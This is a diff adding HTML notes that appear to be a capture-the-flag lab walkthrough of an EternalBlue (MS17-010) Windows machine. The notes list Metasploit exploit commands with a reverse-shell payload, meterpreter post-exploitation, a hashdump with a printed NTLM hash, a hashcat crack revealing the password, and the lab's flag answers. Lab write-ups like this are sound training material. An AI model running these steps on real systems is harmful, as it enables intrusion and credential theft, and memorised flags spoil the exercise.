@@ -1,0 +1,70 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>notes</title>
+</head><body><span style="font-size: 16pt">------------------------------------------------------------------------------------------------------<br/>
+NMAP		-script vuln <br/>
+</span><br/>
+<img src="image.png"/><br/>
+<br/>
+<span style="font-size: 16pt">------------------------------------------------------------------------------------------------------</span><br/>
+<span style="font-size: 16pt">ms17-010 	<ul><li style="list-style-type: none">smb exploit (eternal blue)</li>
+<li style="list-style-type: none"/>
+</ul>
+------------------------------------------------------------------------------------------------------<br/>
+&gt;msfconsole<br/>
+&gt;search ms17-010<br/>
+</span><img height="142" src="image 2.png" width="950"/><br/>
+<br/>
+&gt; use exploit/windows/smb/ms17_010_eternalblue<br/>
+&gt; set RHOST 10.10.22.137<br/>
+&gt; set payload windows/x64/shell/reverse_tcp<br/>
+&gt; set LHOST 10.13.17.108<br/>
+----------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<b>UPGRADE SELL TO METERPRETER SESSION<br/>
+</b>&gt;sessions -u 1<br/>
+<br/>
+or<br/>
+<br/>
+&gt; use post/multi/manage/shell_to_meterpreter<br/>
+&gt; set session [session id]<br/>
+<br/>
+<img src="image 3.png"/><br/>
+-------------------------------------------------------------------------------------------------------------------------------------<br/>
+<b>Within meterpreter</b><br/>
+&gt;migrate 712<br/>
+<img src="image 4.png"/><br/>
+<br/>
+hashdump &gt; results in user passwords hashs<br/>
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------<br/>
+<b>Hashcat<br/>
+</b><b>&gt; </b>hashcat -m 1000 win1.txt /usr/share/wordlists/rockyou.txt<br/>
+<br/>
+password &gt;&gt;&gt;&gt; alqfna22 <b><br/>
+</b><b><br/>
+<br/>
+flag 1 - <ul><li style="list-style-type: none">- flag{access_the_machine} </li>
+<li style="list-style-type: none">- found in root</li>
+<li style="list-style-type: none"/>
+</ul>
+flag 2 - <ul>c:\Windows\System32\config</ul>
+<ul><li style="list-style-type: none">- flag{access_the_machine}</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none"/>
+</ul>
+</b><b>Flag 3 - </b>c:\Users\Jon\Documents\flag3.txt<ul><li style="list-style-type: none">- flag{admin_documents_can_be_valuable}<b/></li>
+</ul>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
